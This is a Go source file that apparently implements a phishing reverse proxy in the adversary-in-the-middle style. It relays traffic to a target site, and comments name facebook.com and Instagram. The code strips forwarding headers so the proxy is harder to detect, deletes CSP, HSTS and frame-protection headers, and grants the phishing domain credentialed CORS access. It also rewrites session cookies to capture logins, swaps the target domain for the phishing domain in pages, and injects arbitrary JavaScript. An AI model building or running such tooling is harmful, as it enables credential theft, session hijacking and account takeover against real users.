package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/andybalholm/brotli"
	"github.com/klauspost/compress/zstd"
)

func createProxy() *httputil.ReverseProxy {
	target, _ := url.Parse("https://www." + targetDomain)
	proxy := httputil.NewSingleHostReverseProxy(target)

	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	//dify request from proxy to target
	proxy.Director = modifyRequest

	// Modify response from proxy to client
	proxy.ModifyResponse = modifyResponse

	return proxy
}

func modifyRequest(req *http.Request) {

	logMessage := "PROXY -> TARGET request\n"

	target, _ := url.Parse("https://www." + targetDomain)

	req.URL.Scheme = target.Scheme
	req.URL.Host = target.Host
	req.Host = target.Host // Critic for SNI in TLS handshake

	// Reomving those headers make proxy harder to detect
	req.Header.Del("X-Forwarded-Proto")
	req.Header.Del("X-Forwarded-For") // Sets the original IP that made request to proxy
	req.Header.Del("Forwarded")
	req.Header.Del("Via")

	req.Header.Set("Host", "www."+targetDomain)           // testsed and works for facebook.com for now
	req.Header.Set("Origin", "https://www."+targetDomain) // tested and works for facebook.com fow now
	req.Header.Del("Referer")                             // this is also to simulate similar request to facebook.com

	if verbosity >= VerbosityHeaders {
		logMessage += fmt.Sprintf("Method: %s\nURL:%s\nHeaders:\n%v\n",
			req.Method, req.URL.String(), formatHeaders(req.Header))
	}

	// Can not log out the request body yet..

	if ShouldFilter(logMessage) {
		log.Println(logMessage)
	}
}

func modifyResponse(resp *http.Response) error {

	logMessage := "CLIENT <- PROXY response\n"

	// Check if original response had CORS headers
	if resp.Header.Get("Access-Control-Allow-Origin") == "*" {
		// Preserve wildcard but DISABLE credentials
		resp.Header.Set("Access-Control-Allow-Origin", "*")
		resp.Header.Del("Access-Control-Allow-Credentials") // Remove if exists
	} else {
		// Set your phishing domain as allowed origin + enable credentials
		resp.Header.Set("Access-Control-Allow-Origin", "https://"+phishingDomain)
		resp.Header.Set("Access-Control-Allow-Credentials", "true")
	}

	// Remove Security Headers
	resp.Header.Del("Content-Security-Policy")
	resp.Header.Del("Content-Security-Policy-Report-Only")
	resp.Header.Del("Strict-Transport-Security")
	resp.Header.Del("X-XSS-Protection")
	resp.Header.Del("X-Content-Type-Options")
	resp.Header.Del("X-Frame-Options")

	// Patch Cookies:
	// I.e., Instagram gives a cookie to keep session, with configuring domain variable of a cookie
	// We manage to set-cookies for reverse proxy.
	if len(resp.Header["Set-Cookie"]) > 0 {

		for i, v := range resp.Header["Set-Cookie"] {
			cookie := strings.ReplaceAll(v, "."+targetDomain, "localhost")
			resp.Header["Set-Cookie"][i] = cookie
		}
	}

	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		if loc := resp.Header.Get("Location"); loc != "" {
			// Use relative path or proxy host
			newLoc := strings.Replace(loc, targetDomain, "/", 1)
			resp.Header.Set("Location", newLoc)
		}
	}

	if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	encoding := resp.Header.Get("Content-Encoding")

	if verbosity >= VerbosityHeaders {
		logMessage += fmt.Sprintf("Status Code: %d\nStatus:%s\nHeaders:\n%v\n",
			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
	}

	body, err := decompressBody(resp.Body, encoding)
	if err != nil {
		return err
	}

	modified := bytes.ReplaceAll(body, []byte(targetDomain), []byte(phishingDomain))
	modified = injectJS(modified, jsPayload)

	if verbosity == VerbosityAll {
		logMessage += string(modified) + "\n"
	}

	newBody, err := compressBody(modified, encoding)
	if err != nil {
		return err
	}

	resp.Body = io.NopCloser(bytes.NewReader(newBody))
	resp.Header.Del("Content-Length")
	resp.ContentLength = int64(len(newBody))

	if encoding != "" {
		resp.Header.Set("Content-Encoding", encoding)
	}

	if ShouldFilter(logMessage) {
		log.Println(logMessage)
	}

	return nil
}

func decompressBody(body io.ReadCloser, encoding string) ([]byte, error) {
	defer body.Close()

	log.Printf("Decompress Method: %s\n", encoding)

	switch encoding {
	case "br":
		br := brotli.NewReader(body)
		defer body.Close()
		return io.ReadAll(br)
	case "gzip":
		gr, err := gzip.NewReader(body)
		if err != nil {
			return nil, err
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "zstd":
		zr, err := zstd.NewReader(body)
		if err != nil {
			return nil, err
		}
		defer zr.Close()
		return io.ReadAll(zr)
	case "deflate":
		fr := flate.NewReader(body)
		defer fr.Close()
		return io.ReadAll(fr)
	default:
		return io.ReadAll(body)
	}
}

func compressBody(data []byte, encoding string) ([]byte, error) {
	var buf bytes.Buffer

	switch encoding {
	case "br":
		br := brotli.NewWriter(&buf)
		if _, err := br.Write(data); err != nil {
			return nil, err
		}
		br.Close()
	case "gzip":
		gw := gzip.NewWriter(&buf)
		if _, err := gw.Write(data); err != nil {
			return nil, err
		}
		gw.Close()
	case "zstd":
		zr, _ := zstd.NewWriter(&buf)
		if _, err := zr.Write(data); err != nil {
			return nil, err
		}
		zr.Close()
	case "deflate":
		fw, _ := flate.NewWriter(&buf, flate.BestCompression)
		if _, err := fw.Write(data); err != nil {
			return nil, err
		}
		fw.Close()
	default:
		buf.Write(data)
	}

	return buf.Bytes(), nil
}

func injectJS(body []byte, payload string) []byte {
	return bytes.Replace(body, []byte("</body>"),
		[]byte("<script>"+payload+"</script></body>"), 1)
}
